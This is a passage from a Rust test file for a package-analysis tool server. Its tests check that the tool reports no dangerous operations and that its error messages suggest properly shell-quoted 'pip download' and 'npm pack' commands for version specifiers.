    let view: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(view["dangerous_operations"], json!([]));
    assert!(view["note"].as_str().unwrap().contains("runs none"));
}

#[tokio::test]
async fn registry_name_errors_quote_a_specifier_a_shell_would_misread() {
    let client = client().await;
    let (is_error, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": "django>=4"}),
    )
    .await;
    assert!(is_error);
    assert!(
        text.contains("pip download 'django>=4' --no-deps"),
        "{text}"
    );
    let (_, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": "lodash@^4"}),
    )
    .await;
    assert!(text.contains("npm pack 'lodash@^4'"), "{text}");
    let (_, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": "express"}),
    )
    .await;
    assert!(text.contains("npm pack express"), "{text}");
}
